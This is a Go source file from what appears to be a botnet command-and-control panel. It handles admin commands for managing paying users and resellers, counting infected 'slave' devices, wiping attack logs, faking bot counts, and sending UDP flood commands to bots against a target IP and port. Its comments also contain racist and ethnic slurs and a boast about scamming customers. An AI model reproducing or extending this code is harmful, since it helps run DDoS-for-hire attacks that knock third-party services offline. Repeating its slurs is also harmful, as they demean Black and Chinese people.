package masters

import (
	"cnc/core/attacks"
	"cnc/core/database"
	"cnc/core/masters/sessions"
	"cnc/core/slaves"
	"cnc/core/utils"
	"fmt"
	"log"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/alexeyco/simpletable"
)

func (a *Admin) Commands() {
	for {
		var botCat string
		var botCount int
		go a.Session.FetchAttacks(a.Session.Username)
		prompt, err := DisplayPrompt(a.Session.Username)
		if err != nil {
			fmt.Println(err)
			return
		}
		a.Printf(prompt)
		cmd, err := a.ReadLine("", false)
		cmd = strings.ToLower(cmd)

		if err != nil || cmd == "clear" || cmd == "cls" || cmd == "c" {
			err := Displayln(a, "./assets/branding/user/clear.txt", a.Session.Username)
			if err != nil {
				return
			}
			continue
		}

		if err != nil || cmd == "home" || cmd == "banner" {
			err := Displayln(a, "./assets/branding/user/banner.txt", a.Session.Username)
			if err != nil {
				return
			}
			continue
		}

		if err != nil || cmd == "logout" || cmd == "exit" || cmd == "quit" {
			KickUser(a.Session.Username) /* easiest way to kick the user without issues */
			continue
		}

		if err != nil || cmd == "?" || cmd == "help" || cmd == "methods" {
			err := Displayln(a, "./assets/branding/user/help.txt", a.Session.Username)
			if err != nil {
				return
			}
			continue
		}

		if cmd == "" {
			continue
		}

		if cmd == "ongoing" {
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}
			ongoingAttacks, err := database.DatabaseConnection.GetOngoingAttacks()
			if err != nil {
				fmt.Println("Error fetching ongoing attacks:", err)
				return
			}

			table := simpletable.New()

			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "Username"},
					{Align: simpletable.AlignCenter, Text: "Host(s)"},
					{Align: simpletable.AlignCenter, Text: "Port"},
					{Align: simpletable.AlignCenter, Text: "Duration"},
					{Align: simpletable.AlignCenter, Text: "Flood Type"},
					{Align: simpletable.AlignCenter, Text: "Time"},
				},
			}

			for _, attack := range ongoingAttacks {
				r := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: attack["username"]},
					{Align: simpletable.AlignCenter, Text: attack["host"]},
					{Align: simpletable.AlignCenter, Text: attack["port"]},
					{Align: simpletable.AlignCenter, Text: attack["duration"]},
					{Align: simpletable.AlignCenter, Text: attack["floodType"]},
					{Align: simpletable.AlignCenter, Text: attack["time"]},
				}

				table.Body.Cells = append(table.Body.Cells, r)
			}

			table.SetStyle(simpletable.StyleCompactLite)
			a.Println(" " + strings.ReplaceAll(table.String(), "\n", "\r\n "))
			continue
		}

		if cmd == "broadcast" {
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}
			err := Displayln(a, "assets/branding/no_broadcast_msg.txt", a.Session.Account.Username)
			if err != nil {
				return
			}
			continue
		}

		if strings.HasPrefix(cmd, "broadcast ") {
			message := strings.TrimPrefix(cmd, "broadcast ")
			if a.Session.Account.Admin {
				BroadcastMessage(message)
			} else {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
			}
			continue
		}

		if strings.HasPrefix(cmd, "attacks enable") {
			if a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					a.Println(err)
					continue
				}
			}
			attacks.GlobalAttacks = true
			if a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/attacks_enabled.txt", a.Session.Account.Username)
				if err != nil {
					a.Println(err)
					continue
				}
			}
			continue
		}

		if strings.HasPrefix(cmd, "attacks disable") {
			if a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					a.Println(err)
					continue
				}
			}
			attacks.GlobalAttacks = false
			if a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/attacks_disabled.txt", a.Session.Account.Username)
				if err != nil {
					a.Println(err)
					continue
				}
			}
			continue
		}

		if cmd == "clogs" {
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}
			confirm, err := a.ReadLine("Are you sure? (y/n): ", false)
			if confirm != "y" {
				continue
			}
			if err != nil {
				a.Println(fmt.Sprintf("\u001B[91munable to clear logs: %v", err))
				continue
			}
			if !database.DatabaseConnection.CleanLogs() {
				a.Println("Unable to clear logs, try again later.")
			}
			a.Println("all logs have been cleared successfully!")
			fmt.Printf("[warn] %s cleared all attack logs!\n", a.Session.Username)
			continue
		}

		if cmd == "users" {
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}
			activeUsers, err := database.DatabaseConnection.Users()
			if err != nil {
				fmt.Println(err)
				continue
			}

			newest := simpletable.New()

			newest.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Username"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Maximum Bots"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Admin"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Superuser"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Reseller"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "VIP"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Attacks"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Max Time"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Cooldown"},
				},
			}

			for _, user := range activeUsers {
				var admin = "\x1b[48;5;9m\x1b[38;5;16m FALSE \x1b[0m"
				if user.Admin {
					admin = "\x1b[48;5;10m\x1b[38;5;16m TRUE \x1b[0m"
				}

				var superuser = "\x1b[48;5;9m\x1b[38;5;16m FALSE \x1b[0m"
				if user.SuperUser {
					admin = "\x1b[48;5;10m\x1b[38;5;16m TRUE \x1b[0m"
				}

				var reseller = "\x1b[48;5;9m\x1b[38;5;16m FALSE \x1b[0m"
				if user.Reseller {
					reseller = "\x1b[48;5;10m\x1b[38;5;16m TRUE \x1b[0m"
				}

				var vip = "\x1b[48;5;9m\x1b[38;5;16m FALSE \x1b[0m"
				if user.Vip {
					vip = "\x1b[48;5;10m\x1b[38;5;16m TRUE \x1b[0m"
				}

				var maxtimeInfo = strconv.Itoa(user.Bots)
				if user.Bots == -1 {
					maxtimeInfo = "unlimited"
				}

				xd, err := database.DatabaseConnection.GetTotalAttacks(user.Username)
				if err != nil {
					fmt.Printf("can't get user total attacks: %v\n", err)
					return
				}
				rk := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + user.Username},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + maxtimeInfo},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + admin},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + superuser},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + reseller},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + vip},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strconv.Itoa(xd)},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strconv.Itoa(user.MaxTime)},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strconv.Itoa(user.Cooldown)},
				}

				newest.Body.Cells = append(newest.Body.Cells, rk)
			}

			newest.SetStyle(simpletable.StyleCompact)
			a.Printf(strings.ReplaceAll(newest.String(), "\n", "\r\n") + "\r\n")
			continue
		}

		if a.Session.Account.Admin && cmd == "fake" {
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}
			slaves.Fake = !slaves.Fake
			a.Println(slaves.Fake)
			continue
		}

		if strings.HasPrefix(cmd, "users add") {
			args := strings.Fields(cmd)
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}

			if len(args) != 12 {
				a.Println("Usage: users add <Username> <Password> [...options]")
				a.Println("Example: users add newuser secretpass -1 60 100 100 1d false false true")
				a.Println("")
				a.Println("Add argument documentation:")
				a.Println("   Username          -   The username of the new user")
				a.Println("   Password          -   The New_pass of the new user")
				a.Println("   Max Bots          -   The maximum number of devices the new user can access")
				a.Println("   Attack Duration   -   The maximum attack duration for the new user")
				a.Println("   Attack Cooldown   -   The cooldown between attacks for the new user")
				a.Println("   Max Daily Attacks -   The maximum number of attacks per day for the new user")
				a.Println("   Account Expiry    -   The time before the new user's account expires (e.g., 1d1w1m1s)")
				a.Println("   Admin Status      -   Is the new user an admin?")
				a.Println("   Reseller Status   -   Is the new user a reseller?")
				a.Println("   VIP Status        -   Is the new user a VIP user?")
				a.Println("")
				continue
			}

			NewUser := args[2]
			NewPass := args[3]
			maxBotsStr := args[4]
			durationStr := args[5]
			cooldownStr := args[6]
			userMaxAttacksStr := args[7]
			expiryHoursStr := args[8]
			isAdminStr := args[9]
			isResellerStr := args[10]
			isVipStr := args[11]

			// Convert and parse the arguments as needed
			maxBots, err := strconv.Atoi(maxBotsStr)
			if err != nil {
				a.Println("Invalid Max Bots value.")
				continue
			}
			duration, err := strconv.Atoi(durationStr)
			if err != nil {
				a.Println("Invalid Attack Duration value.")
				continue
			}
			cooldown, err := strconv.Atoi(cooldownStr)
			if err != nil {
				a.Println("Invalid Attack Cooldown value.")
				continue
			}
			userMaxAttacks, err := strconv.Atoi(userMaxAttacksStr)
			if err != nil {
				a.Println("Invalid Max Daily Attacks value.")
				continue
			}
			expiryDuration, err := utils.ParseDuration(expiryHoursStr)
			if err != nil {
				a.Println("Invalid time format: ", err)
				continue
			}

			expiry := time.Now().Add(expiryDuration).Unix()
			isAdmin, err := strconv.ParseBool(isAdminStr)
			if err != nil {
				a.Println("Invalid Admin Status value.")
				continue
			}
			isReseller, err := strconv.ParseBool(isResellerStr)
			if err != nil {
				a.Println("Invalid Reseller Status value.")
				continue
			}

			isVip, err := strconv.ParseBool(isVipStr)
			if err != nil {
				a.Println("Invalid VIP Status value.")
				continue
			}

			if a.Session.Account.Reseller && !a.Session.Account.Admin && isAdmin {
				a.Println("Resellers cannot add admin users.")
				continue
			}

			if a.Session.Account.Reseller && !a.Session.Account.Admin && isReseller {
				a.Println("Resellers cannot add other resellers.")
				continue
			}

			if database.DatabaseConnection.UserExists(NewUser) {
				a.Println("user already exists")
				continue
			}

			if database.DatabaseConnection.CreateUser(NewUser,
				NewPass,
				a.Session.Username,
				maxBots,
				userMaxAttacks,
				duration,
				cooldown,
				isAdmin,
				isReseller,
				isVip,
				expiry) {
				a.Println("User added successfully.")
				continue
			} else {
				a.Println("Unable to create a new user, check the console for more details.")
				continue
			}
		}

		if strings.HasPrefix(cmd, "users remove") {
			args := strings.Fields(cmd)
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}

			if len(args) != 3 {
				a.Println("Usage: users remove <username>, e.g., users remove tester")
				continue
			}

			usernameToRemove := args[2]

			if a.Session.Account.Reseller && !database.DatabaseConnection.GetParent(usernameToRemove, a.Session.Username) && !a.Session.Account.Admin && !a.Session.Account.SuperUser {
				a.Println("Resellers can only remove users they have created.")
				continue
			}

			if !database.DatabaseConnection.UserExists(usernameToRemove) {
				a.Println("user does not exist")
				continue
			}

			KickUser(usernameToRemove)

			err := database.DatabaseConnection.RemoveUser(usernameToRemove)
			if err != nil {
				a.Println("Error removing user: ", err)
				continue
			}
			a.Println(fmt.Sprintf("Removed @%s successfully.", usernameToRemove))
			continue
		}

		if strings.HasPrefix(cmd, "users timeout") {
			args := strings.Fields(cmd)
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}

			if len(args) != 4 {
				a.Println("Usage: users timeout <username> <duration>, e.g., users timeout tester 5")
				continue
			}
			usernameToTimeout := args[2]
			timeoutDurationStr := args[3]
			timeoutDuration, err := strconv.Atoi(timeoutDurationStr)
			if err != nil {
				a.Println("Invalid duration value.")
				continue
			}

			if database.DatabaseConnection.IsSuper(usernameToTimeout) {
				a.Println("you are not allowed to perform this action on a superuser")
				continue
			}

			msg, success := UserTimeout(usernameToTimeout, timeoutDuration)
			a.Println(msg)
			if success {
				log.Printf("[admin - timeout] User '%s' has been timed out for %d minutes\n", usernameToTimeout, timeoutDuration)
				continue
			}
			continue
		}

		if strings.HasPrefix(cmd, "users untimeout") {
			args := strings.Fields(cmd)
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}
			if len(args) != 3 {
				a.Println("Usage: users untimeout <username>, e.g., users untimeout tester")
				continue
			}

			usernameToUntimeout := args[2]
			msg, success := UserUntimeout(usernameToUntimeout)
			a.Println(msg)
			if success {
				// Optionally, log the untimeout action
				log.Printf("[admin - untimeout] User '%s' has been untimed out\n", usernameToUntimeout)
			}
			continue
		}

		if strings.HasPrefix(cmd, "sessions kick") {
			args := strings.Fields(cmd)
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}

			if len(args) != 3 {
				a.Println("Usage: sessions kick <username>, e.g., sessions kick tester")
				continue
			}

			usernameToRemove := args[2]

			if database.DatabaseConnection.IsSuper(usernameToRemove) {
				a.Println("you are not allowed to perform this action on a superuser")
				continue
			}

			KickUser(usernameToRemove)
			a.Println("Kicked " + usernameToRemove + " successfully")
			continue
		}

		err = parsePresetsJSON("assets/presets.json")
		if err != nil {
			a.Println("Error loading presets:", err)
			return
		}

		if strings.HasPrefix(cmd, "add") {
			args := strings.Fields(cmd)
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}

			if len(args) != 4 {
				a.Println("Usage: add <preset> <username> <password>")
				a.Println("Example: add day newUser change!!1\r\n")
				a.Println("Available Presets:")
				for _, p := range Presets {
					a.Printf("   %s - %s\r\n", p.Preset, p.Description)
				}
				continue
			}
			NewUser := args[2]
			NewPass := args[3]
			presetName := args[1]

			var selectedPreset PresetInfo
			presetFound := false

			for _, p := range Presets {
				if p.Preset == presetName {
					selectedPreset = p
					presetFound = true
					break
				}
			}

			if !presetFound {
				a.Println("Invalid preset. Available presets are:")
				for _, p := range Presets {
					a.Printf("   %s - %s\r\n", p.Preset, p.Description)
				}
				continue
			}

			expiryDuration, err := utils.ParseDuration(selectedPreset.Expiry)
			if err != nil {
				a.Println(err)
				continue
			}

			expiry := time.Now().Add(expiryDuration).Unix()

			if database.DatabaseConnection.UserExists(NewUser) {
				a.Println("user already exists")
				continue
			}

			if database.DatabaseConnection.CreateUser(NewUser,
				NewPass,
				a.Session.Username,
				selectedPreset.MaxBots,
				selectedPreset.UserMaxAttacks,
				selectedPreset.Duration,
				selectedPreset.Cooldown,
				selectedPreset.IsAdmin,
				selectedPreset.IsReseller,
				selectedPreset.IsVip,
				expiry) {
				a.Println("User added successfully.")
				continue
			} else {
				a.Println("Unable to create a new user, check the console for more details.")
				continue
			}
		}

		if err != nil || strings.ToLower(strings.Split(cmd, " ")[0]) == "sessions" {
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}
			newest := simpletable.New()

			newest.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Username"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Maximum Bots"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Administrator"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Attacks"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Remote Host"},
				},
			}

			for _, s := range sessions.Sessions {
				var admin = "\x1b[48;5;9m\x1b[38;5;16m FALSE \x1b[0m"
				if s.Account.Admin {
					admin = "\x1b[48;5;10m\x1b[38;5;16m TRUE \x1b[0m"
				}

				var maxtimeInfo = strconv.Itoa(s.Account.Bots)
				if s.Account.Bots == -1 {
					maxtimeInfo = "unlimited"
				}

				xd, err := database.DatabaseConnection.GetTotalAttacks(s.Username)
				if err != nil {
					fmt.Printf("can't get user total attacks: %v\n", err)
					return
				}

				remote := s.Conn.RemoteAddr().String()
				host, _, err := net.SplitHostPort(remote)
				if err != nil {
					return
				}
				if host == "127.0.0.1" || host == "::1" || host == "0.0.0.0" {
					host = "localhost"
				}

				rk := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + s.Account.Username},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + maxtimeInfo},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + admin},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strconv.Itoa(xd)},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + host},
				}

				newest.Body.Cells = append(newest.Body.Cells, rk)
			}

			newest.SetStyle(simpletable.StyleCompact)
			a.Printf(strings.ReplaceAll(newest.String(), "\n", "\r\n") + "\r\n")
			continue
		}

		if cmd == "passwd" || cmd == "changepw" {
			line, err := a.ReadLine("New password: ", false)
			if err != nil {
				fmt.Println(err)
				return // we encountered an error, close connection and print it
			}
			if line == "" {
				a.Println("New password cannot be blank")
				continue // continue reading
			}
			if len(line) < 8 {
				a.Println("New password must be more than 8 characters")
				continue // continue reading
			}
			continue // continue reading
		}

		if cmd == "bots" {
			/* Default option - versions */
			m := slaves.CL.Distribution()
			for k, v := range m {
				change := v - PreviousDistribution[k]
				if change > 0 {
					a.Println(fmt.Sprintf("\u001B[0m %s: %d (\u001B[92m+%d\u001B[0m)", k, v, change)) /* x86: 5 (+3) */
				} else if change < 0 {
					a.Println(fmt.Sprintf("\u001B[0m %s: %d (\u001B[91m%d\u001B[0m)", k, v, change)) /* x86: 2 (-3) */
				} else {
					a.Println(fmt.Sprintf("\u001B[0m %s: %d", k, v)) /* x86: 5 */
				}
			}
			PreviousDistribution = m /* reset previous distribution */
			continue                 /* read again */
		}

		if strings.HasPrefix(cmd, "bots -s") {
			args := strings.Fields(cmd)
			if len(args) < 3 {
				a.Println("\x1b[91mplease provide a search query")
				continue
			}

			search := args[2]
			m := slaves.CL.Distribution()
			for k, v := range m {
				if k == search {
					change := v - PreviousDistribution[k]
					if change > 0 {
						a.Println(fmt.Sprintf("\u001B[0m %s: %d (\u001B[92m+%d\u001B[0m)", k, v, change)) /* x86: 5 (+3) */
					} else if change < 0 {
						a.Println(fmt.Sprintf("\u001B[0m %s: %d (\u001B[91m%d\u001B[0m)", k, v, change)) /* x86: 2 (-3) */
					} else {
						a.Println(fmt.Sprintf("\u001B[0m %s: %d", k, v)) /* x86: 5 */
					}
				}
			}
			PreviousDistribution = m /* reset previous distribution */
			continue                 /* read again */
		}

		if cmd == "bots -c" {
			/* Count option - return count of connected slaves */
			count := slaves.CL.Count()
			a.Println(fmt.Sprintf("there are currently %d slaves connected", count))
			continue
		}

		if cmd[0] == '@' {
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
			}

			cataSplit := strings.SplitN(cmd, " ", 2)

			if len(cataSplit) > 1 {
				botCat = cataSplit[0][1:]
				cmd = cataSplit[1]
			} else {
				a.Println("Usage: @<group> <command>")
				a.Println("Example: @x86_64 !udpplain 70.70.70.72 30 dport=80 size=1400")
				continue
			}
		}

		botCount = a.Session.Account.Bots
		isAdmin := 0
		if a.Session.Account.Admin {
			isAdmin = 1
		}

		/* The CIA Niggers glow in the dark. You can see them when you're driving. You just run them over, that's what you do */

		atk, err := attacks.NewAttack(cmd, isAdmin, a.Session.Username)
		if err != nil {
			a.Println(err.Error())
		} else {
			buf, err := atk.Build()
			if err != nil {
				a.Println(err.Error())
			} else {
				if GlobalSlots >= attacks.MaxGlobalSlots {
					a.Println("All attack slots are in use, please wait.")
					continue
				}
				if can, err := database.DatabaseConnection.CanLaunchAttack(a.Session.Username, atk.Duration, cmd, botCount, 0); !can {
					a.Println(err.Error())
				} else {
					go SlotsCooldown(a.Session.Username) /* stole dosbot's fake slots to scam da chinks */
					err := Displayln(a, "assets/branding/attacks/attack_sent.txt", a.Session.Username)
					if err != nil {
						continue
					}
					slaves.CL.QueueBuf(buf, botCount, botCat)
					err = database.DatabaseConnection.IncreaseTotalAttacks(a.Session.Username)
					if err != nil {
						fmt.Println(err)
						continue
					}
				}
			}
		}
	}
}
